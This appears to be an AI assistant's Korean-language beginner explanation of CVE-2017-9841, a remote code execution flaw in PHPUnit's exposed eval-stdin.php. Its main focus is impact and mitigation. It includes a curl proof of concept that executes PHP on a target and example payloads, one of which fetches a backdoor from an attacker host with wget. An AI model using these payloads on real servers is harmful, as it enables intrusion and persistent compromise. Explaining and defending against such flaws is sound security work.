좋아요, **CVE-2017-9841**은 PHP 기반 웹사이트에 발생할 수 있는 **심각한 원격 코드 실행(RCE) 취약점**입니다.
초보자도 이해할 수 있게 아주 **쉽게** 설명해드릴게요.

---

## 🧨 이 취약점 한 줄 요약:

> PHPUnit이 설치된 서버에 **외부에서 악성 코드를 실행**할 수 있는 **문이 열려 있었던 문제**예요.

---

## ✅ 개념 먼저! "PHPUnit"이 뭐야?

**PHPUnit**은 PHP 개발자들이 코드를 테스트할 때 쓰는 **테스트 도구**예요.

* 실제 웹 서비스에는 쓰이지 않지만,
* 개발자가 설치하고, 가끔 실수로 **서버에 그대로 두는 경우**가 있어요.

> 🧱 마치 공사 끝났는데 공구를 치우지 않고 문 앞에 놓고 간 상황이라고 보면 돼요.

---

## ⚠️ 문제 요약 – CVE-2017-9841

PHPUnit에는 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` 라는 파일이 있는데,
이 파일이 **외부에서 PHP 코드를 받아서 그대로 실행**하는 구조였습니다.

### 예를 들어:

```bash
curl -X POST http://example.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php \
     -d '<?php system("id"); ?>'
```

👉 서버는 `system("id");` 라는 PHP 코드를 **그대로 실행**해서 결과를 돌려줘요!

---

## 🎯 공격자가 이걸 이용하면?

* `<?php system("ls"); ?>` → 서버 파일 목록 보기
* `<?php file_put_contents("shell.php", ...); ?>` → 웹셸 업로드
* `<?php exec("wget http://attacker.com/backdoor"); ?>` → 백도어 설치

즉, **공격자가 서버에서 원하는 명령어를 실행**할 수 있게 됩니다.

---

## 🔥 이게 왜 무서움?

| 항목             | 설명                      |
| -------------- | ----------------------- |
| 📂 서버 파일 접근 가능 | 내부 정보 유출                |
| 💣 웹셸 설치       | 서버 완전히 장악               |
| 🛠 백도어 심기      | 계속 침투 가능                |
| 🤐 조용히 악성코드 배포 | 해킹당한 웹사이트 통해 악성코드 유포 가능 |

---

## ❌ 어떤 서버가 위험했나?

* **PHP 기반 웹사이트**
* composer로 설치한 PHPUnit이 **웹 루트에 노출**되어 있을 경우

  ```
  /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
  ```
* 이 파일이 **인터넷에서 접근 가능하면** → 바로 공격 가능

---

## ✅ 대응 방법

| 방법                     | 설명                                |
| ---------------------- | --------------------------------- |
| 해당 파일 삭제               | `eval-stdin.php` 파일을 삭제 또는 차단해야 함 |
| 웹서버에서 `/vendor/` 경로 차단 | Apache/Nginx 설정으로 접근 못하게          |
| 최신 PHPUnit 사용          | 취약점 패치된 버전 사용 (4.8.29 이상 등)       |
| 프로덕션 서버에 테스트 도구 배포 ❌   | 개발 도구는 절대 배포하지 말기                 |

---

## 🔐 실제 점검 팁

서버에서 이런 파일이 있는지 확인해 보세요:

```bash
find /var/www/html -name eval-stdin.php
```

혹은 웹에서 직접 시도:

```
http://example.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

→ 200 OK가 뜬다? **위험한 상태입니다!**

---

## ✅ 요약

| 항목       | 내용                       |
| -------- | ------------------------ |
| 취약점 이름   | CVE-2017-9841            |
| 영향 받는 대상 | PHPUnit을 설치한 PHP 웹서버     |
| 공격 방식    | 원격에서 PHP 코드 실행 (RCE)     |
| 피해 사례    | 웹셸 설치, 백도어, 서버 장악        |
| 대응 방법    | 해당 파일 삭제 또는 차단, 최신 버전 사용 |

---

필요하시면 실제 공격 재현 시나리오나, 방화벽 룰로 차단하는 방법도 알려드릴게요.
